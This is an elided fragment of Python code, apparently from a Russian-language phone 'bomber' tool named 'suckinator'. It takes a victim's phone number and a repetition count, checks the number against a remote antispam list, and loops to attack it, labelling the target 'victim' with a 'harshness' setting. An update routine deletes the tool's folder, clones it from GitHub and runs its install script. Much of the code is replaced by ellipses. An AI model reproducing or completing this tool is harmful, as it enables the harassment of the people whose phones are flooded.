    ...
    try:
        ...
        def Main():
            ...
            def update():
                ...
                if a == "y":
                    os.system(
                        "cd && rm -rf ~/suckinator && git clone https://github.com/FrouJoker/suckinator && sh ~/suckinator/install.sh")
                    exit()
                else:
                    print("Отменено")
                    ...
                    if int(phone):
                        ...
                        try:
                            if int(count):
                                ...
                                iteration = 0
                                id = \
                                requests.post('https://fsystem88.ru/spymer/json.php', data={'phone': phone}).json()[
                                    "id"]
                                if int(id) > 0:
                                    info = Fore.RED + "\nНомер телефона находится в антиспам листе." + Style.RESET_ALL
                                elif int(id) == 0:
                                    addparams()
                                    info = '\nЖертва: {}\nЖёсткость: {}'.format(phone,
                        ...
                        if int(count):
                            ...
                            for phone in array:
                                ...
                                try:
                                    ...
                                    print(Fore.RED + '\n"{}" не является номером телефона.'.format(
